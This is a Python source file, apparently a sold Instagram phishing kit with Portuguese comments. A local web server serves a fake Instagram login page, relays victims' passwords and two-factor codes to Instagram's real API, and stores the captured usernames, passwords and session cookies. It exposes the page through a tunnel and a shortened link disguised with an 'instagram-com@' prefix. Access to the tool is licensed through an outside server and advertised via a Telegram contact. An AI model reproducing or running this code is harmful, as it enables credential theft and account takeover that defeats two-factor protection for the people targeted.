import requests
from datetime import datetime
import re
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO
import os
import ast
from time import sleep
from datetime import datetime

ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"

def insta_login(usuario,senha,user_agent):
    print("insta_login")
    try:
        # https://github.com/akashblackhat/instagrame-hacking/blob/main/instagrame-hacking.py
        headers1 = {
    'User-Agent': user_agent,
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'X-CSRFToken': 'qMmj6b03CQZFE22vHsjV9bLQ5pFBSEru',
    'X-Instagram-AJAX': '1016503870',
    'X-IG-App-ID': '936619743392459',
    'X-ASBD-ID': '129477',
    'X-IG-WWW-Claim': 'hmac.AR1LrdDSIZLT0lDFhXi0lgpmc02ULErjjfRMYpjoUfqG5j68',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.instagram.com',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://www.instagram.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
        }

        sess = requests.Session()
        res1 = sess.get(url="https://www.instagram.com/",headers=headers1)
        csrf = re.findall(r"csrf_token\":\"(.*?)\"", res1.text)[0]
        print(csrf)
        headers1["X-CSRFToken"] = csrf
        time = int(datetime.now().timestamp())
        data = {
    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{senha}',
    'caaF2DebugGroup': '-1',
    'loginAttemptSubmissionCount': '1',
    'optIntoOneTap': 'false',
    'queryParams': '{}',
    'trustedDeviceRecords': '{}',
    'username': usuario,
    }

        print("res1 sucesso!")
        res2 = sess.post(url="https://www.instagram.com/api/v1/web/accounts/login/ajax/",headers=headers1,data=data)
        res2_cookies = res2.cookies.get_dict()
        print("Response Text:",res2.text)
        print("Cookie JSON:",res2_cookies)
        if '"oneTapPrompt":true' in res2.text or 'two_factor_required' in res2.text:
            login_db_list = openDb("login_db.json")
            cookie = jsonToData(res2.cookies.get_dict())
            it_exists = itAlreadyInDb(["email","password"],[usuario,senha],login_db_list)
            if it_exists:
                login_db_list[it_exists-1]["cookie"] = cookie
            else:
                login_db_list += [{"email":usuario,"password":senha,"cookie":cookie}]
            #saveLogin(login_db_list,usuario,senha,cookie)
            saveDb(login_db_list,"login_db.json")
        if '"oneTapPrompt":true' in res2.text:
            saveDb(login_db_list,"login_db.json")
            
            print("logado com sucesso")
            return "sucesso"
        elif 'two_factor_required' in res2.text:
            #saveLogin(login_db_list,usuario,senha,cookie)
            saveDb(login_db_list,"login_db.json")
            print("pediu 2fa")
            
            true = false = null = 1
            res_json = json.loads(res2.text)
            print("res2 text:",res2.text)
            print("res_json:",res_json)
            identifier = res_json["two_factor_info"]["two_factor_identifier"]
            username = res_json["two_factor_info"]["username"]
            print("username:",username)
            fa2_next = {
    'identifier': identifier,
    'queryParams': '{"next":"/"}',
    'trust_signal': 'true',
    'username': username,
    'verification_method': '3',
    'verificationCode': '718719',
            }
            print("fa2_next:",fa2_next)
            print("Usuario:",usuario)
            fa_next_list = openDb("2fa_next_db.json",{})
            fa_next_list[usuario] = fa2_next
            print("fa_next_list:",fa_next_list)
            #save2faNext(fa_next_list,usuario,fa2_next)
            saveDb(fa_next_list,"2fa_next_db.json")

            return "pediu_2fa"
        else:
            print("erro ao fazer login")
            return "senha_incorreta"
    except Exception as e:
        print(e)

def insta_2fa_login(usuario,code,user_agent):
    print("2fa_login")
    try:
        headers1 = {
    'User-Agent': user_agent,
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.5',
    'X-CSRFToken': 'qMmj6b03CQZFE22vHsjV9bLQ5pFBSEru',
    'X-Instagram-AJAX': '1016503870',
    'X-IG-App-ID': '936619743392459',
    'X-ASBD-ID': '129477',
    'X-IG-WWW-Claim': 'hmac.AR1LrdDSIZLT0lDFhXi0lgpmc02ULErjjfRMYpjoUfqG5j68',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://www.instagram.com',
    'DNT': '1',
    'Sec-GPC': '1',
    'Connection': 'keep-alive',
    'Referer': 'https://www.instagram.com/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
        }
        login_db_list = openDb("login_db.json")
        print("Usuario:",usuario)
        print("login_db_list:",login_db_list)
        
        cookies_data = login_db_list[itAlreadyInDb(["email"],[usuario],login_db_list)-1]["cookie"]
        senha = login_db_list[itAlreadyInDb(["email"],[usuario],login_db_list)-1]["password"]
        cookies_json = dataToJson(cookies_data)
        
        print("Cookies_data:",cookies_data)
        print("Cookies_json:",cookies_json)
        print("next step")
        fa2_next = openDb("2fa_next_db.json",{})[usuario]
        print("fa2 next:",fa2_next)
        fa2_next["verificationCode"] = code

        headers1["X-CSRFToken"] = cookies_json["csrftoken"]
        sess = requests.Session()
        res = sess.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/two_factor/',cookies=cookies_json,headers=headers1,data=fa2_next)
        
        #print("Session Cookies:",sess.cookies.get_dict())
        print("Response Text:",res.text)
        print("Res Cookies:",res.cookies.get_dict())
        if '"error_type":"invalid_verficaition_code"' in res.text:
            print("Codigo invalido")
            return "codigo_invalido"
        elif '"authenticated":true' in res.text:
            print("2FA logado com sucesso")
            sessionid = "sessionid="+res.cookies.get_dict()["sessionid"]
            saveDb(login_db_list,"login_db.json")
            #saveLogin(login_db_list,usuario,senha,sessionid)
            #insta_2fa_disable(usuario,user_agent)
            return "sucesso"
        elif '"message":"checkpoint_required"' in res.text:
            print("Checkpoint required")
            return "checkpoint_required"
    except Exception as e:
        print(e)

def insta_trust_device(usuario):
	try:
		None
	except Exception as e:
		print("Insta Trust Device:",e)

def instaLoginRoute(data_json):
  try:
    usuario = data_json["usuario"]
    senha = data_json["senha"]
    print("Usuario:",usuario)
    print("Senha:",senha)
    user_agent = data_json["user_agent"]
    resultado = insta_login(usuario,senha,ua)
    print(resultado)
    return resultado
  except Exception as e:
    print(e)

def insta2faRoute(data_json):
  try:
    print("insta 2fa ok")
    usuario = data_json["usuario"]
    codigo = data_json["codigo"]
    print("Codigo de Verificação:",codigo)
    user_agent = data_json["user_agent"]
    resultado = insta_2fa_login(usuario,codigo,ua)
    print(resultado)
    return resultado
  except Exception as e:
    print(e)

def painelLoginRoute(data_json):
  try:
    print("Painel login:",data_json)
    codigo = data_json["codigo"]
    uid = os.popen("uname -a|md5sum|cut -c -32").read().replace("\n","")
    if sessionIsValid(codigo):
      print("Código continua válido.. não precisa enviar requisição pro servidor!")
      resultado = '{"sucesso":1,"msg":"Código continua válido.. não precisa enviar requisição pro servidor!"}'
      return str(resultado).replace("'",'"').replace("\n","")
    
    print(f"my uid: '{uid}'")
    data = {"codigo":codigo,"uid":uid}
    head = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"}
    res = requests.post(url="http://inst2fa.x10.mx/login.php",data=data,headers=head)
    res_json = ast.literal_eval(res.text)
    print("\033[1;32mPainel login res json:",str(res_json)+"\033[0m")
    
    if res_json["sucesso"]:
      session_list = {}
      session_list["codigo"] = codigo
      session_list["uid"] = uid
      session_list["expiracao"] = res_json["expiracao"]
      print("Session_list:",session_list)
      #saveSession(session_list)
      saveDb(session_list,"session_db.json")
      resultado = '{"sucesso":1,"msg":"Logado com sucesso!"}'
    else:
      resultado = str(res_json)
    return str(resultado).replace("'",'"').replace("\n","")
  except Exception as e:
    print("painel login Route:",e)

def painelGetUrlsRoute():
  try:
    resultado = {"sucesso":1,"msg":"Urls conletadas com sucesso!"}
    if not sessionIsValid():
      url_list = []
      resultado["urls"] = [{"url":"https://t.me/darwinDoMal"},{"url":"https://t.me/darwinDoMal"}]
      return str(resultado).replace("'",'"').replace("\n","")
    tunwg_log = open("port_forwarding/tunwg.log","r").read()
    tunwg_url = re.findall(r":7777 <= ([\S]+)",tunwg_log)[0]+"/insta/login.html"
    isgd_url = openDb("url_db.json")["is_gd"]
    
    url_list = []
    url_list += [{"url":tunwg_url}]
    url_list += [{"url":isgd_url}]
    #url_list += [{"url":"https://bit.ly/urlencurtada"}]
    print("url_list:",url_list)
    
    resultado["urls"] = url_list
    return str(resultado).replace("'",'"').replace("\n","")
  except Exception as e:
    return '{"sucesso":0,"msg":"Não foi possivel pegar as urls! Por favor, Reinicie a ferramenta ou mande mensagem para t.me/@darwinDoMal !"}'
    print("painel get urls route:",e)

def painelGetLoginsRoute():
  try:
    resultado = {"sucesso":1,"msg":"Logins carregados com sucesso!"}
    if not sessionIsValid():
      resultado["logins"] = [{"email":"Seu Código Expirou","password":"Me mandar msg =>","cookie":"https://t.me/darwinDoMal"}]
      return str(resultado).replace("'",'"').replace("\n","")
    login_db = ast.literal_eval(open("login_db.json","r").read())
    resultado["logins"] = login_db
    return str(resultado).replace("'",'"').replace("\n","")
  except Exception as e:
    return '{"sucesso":0,"msg":"Não foi possivel pegar os logins! Por favor, mande mensagem para t.me/@darwinDoMal !"}'
    print("painel get login route:",e)

def jsonToData(jj):
  try:
    data = ""
    for j in jj:
      print("j:",j)
      print("data:",data)
      data += f"{j}={jj[j]}&"
    return data
  except Exception as e:
    print("json to data:",e)

def dataToJson(data):
  try:
    if data[-1] == "&":
      data = data[:-1]
    tmp = '{"'+data.replace("=",'":"').replace("&",'","')+'"}'
    #return json.loads(tmp)
    return ast.literal_eval(tmp)
  except Exception as e:
    print("data to json:",e)

def itAlreadyInDb(it,it_value,db):
  cont = 1
  for name in db:
    try:
      if len(it) > 1:
        if name[it[0]] == it_value[0] and name[it[1]] == it_value[1]:
          return cont
      else:
        if name[it[0]] == it_value[0]:
          return cont
    except Exception as e:
      print("it already in db:",e)
    cont += 1
  return False

def openDb(db_filename,tipo=[]):
  try:
    if not os.path.exists(db_filename):
      dba = open(db_filename,"a")
      dba.write(str(tipo))
      dba.close()
      db_list = tipo
    else:
      db_list = ast.literal_eval(open(db_filename,"r").read())
    return db_list
  except Exception as e:
    print(e)
    return tipo


def saveDb(db_list,db_filename):
	try:
		print("(Save DB) db_list:",db_list)
		open(db_filename,"a")
		dbw = open(db_filename,"w")
		dbw.write(str(db_list))
		dbw.close()
	except Exception as e:
		print("saveDb error:",e)

def sessionIsValid(codigo=False):
	try:
		session_db = openDb("session_db.json",[])
		if session_db:
			db_codigo = session_db["codigo"]
			if not codigo:
				codigo = db_codigo
			db_expiracao = datetime.strptime(session_db['expiracao'], '%Y-%m-%d %H:%M:%S')
			print("session_db:",session_db)
			if codigo == db_codigo and datetime.now() > db_expiracao:
				return False
		else:
			return False
		return True
	except Exception as e:
		print("sessionIsValid:",e)

def startTunwg():
  try:
    print("Iniciando TunWG ...")
    os.system("killall -9 tunwg 2> /dev/null")
    #os.system("rm port_forwarding/tunwg.log 2> /dev/null")
    os.system("port_forwarding/./tunwg -p 7777 > port_forwarding/tunwg.log 2>&1 &")
    sleep(5)
    tunwg_log = open("port_forwarding/tunwg.log","r").read()
    tunwg_url = re.findall(r":7777 <= ([\S]+)",tunwg_log)[0]+"/insta/login.html"
    isGdShortUrl(tunwg_url)
  except Exception as e:
    print("start Tunwg:",e)
    

def isGdShortUrl(url):
	try:
		headers = {
    			'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
    # 'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://is.gd',
    'Connection': 'keep-alive',
    'Referer': 'https://is.gd/',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Priority': 'u=0, i',
		}
		data = {
   		 'url': url,
   		 'shorturl': '',
   		 'opt': '0',
		}
		response = requests.post('https://is.gd/create.php', headers=headers, data=data)
		shorted_url = re.findall(r'id="short_url" value="([\S]+)" ',response.text)[0]
		shorted_url = shorted_url.replace("https://","https://instagram-com@")
		print("Shorted URL:",shorted_url)
		url_list = {"is_gd":shorted_url}
		saveDb(url_list,"url_db.json")
		return shorted_url
	except Exception as e:
		print("Is GD short url:",e)
		return "https://erro.com/#impossivel_encurtar_a_URl"

def spoofUrlPreview(url):
	try:
		headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0'}
		res = requests.get(url=url,headers=headers)
	except Exception as e:
		print("Spoof Url Preview:",e)

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        path = self.path[1:]
        print(f"path: '{path}'")
        if ".py" in path or ".json" in path or ".log" in path:
          self.send_response(403)
          fl = b"Not Authorized"
        elif not path.split("/").pop():
          self.send_response(200)
          fl = open("index.html","rb").read()
        elif os.path.exists(path):
          self.send_response(200)
          fl = open(path,"rb").read()
        else:
          self.send_response(404)
          fl = b"Not Found"
        self.end_headers()
        self.wfile.write(fl)

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length)
        #print("Raw body:",body)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        response = BytesIO()
        data = body.decode("utf-8")
        #print(self.headers)
        print("Data:",data)
        if self.headers["Content-Type"] != "application/json":
          data_json = dataToJson(data)
          print("Post data json:",data_json)
          #data_json = json.loads('{"'+data.replace('=','":"').replace('&','","')+'"}')
        else:
          #data_json = json.loads(data)
          data_json = ast.literal_eval(data)
        print(data_json)

        modo = data_json["modo"]
        if modo == "insta_login":
            resultado = instaLoginRoute(data_json)
        elif modo == "insta_2fa":
          resultado = insta2faRoute(data_json)
        elif modo == "painel_login":
          self.send_header('Access-Control-Allow-Origin','application/json')
          resultado = painelLoginRoute(data_json)
        elif modo == "get_urls":
          self.send_header('Access-Control-Allow-Origin','application/json')
          resultado = painelGetUrlsRoute()
        elif modo == "get_logins":
          self.send_header('Access-Control-Allow-Origin','application/json')
          resultado = painelGetLoginsRoute()

        print("Resultado:",resultado)
        response.write(resultado.encode())
        self.end_headers()
        self.wfile.write(response.getvalue())


# ssh -R 80:localhost:3000 serveo.net
# ou 
# ssh -R 80:localhost:8080 nokey@localhost.run

#ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"


def startTool():
	openDb("login_db.json")
	openDb("2fa_next_db.json",{})
	openDb("session_db.json",{})
	openDb("url_db.json",{})
	print("Servidor rodando na porta 7777")
	startTunwg()
	httpd = HTTPServer(('0.0.0.0', 7777), SimpleHTTPRequestHandler)
	httpd.serve_forever()
	
#startTool()
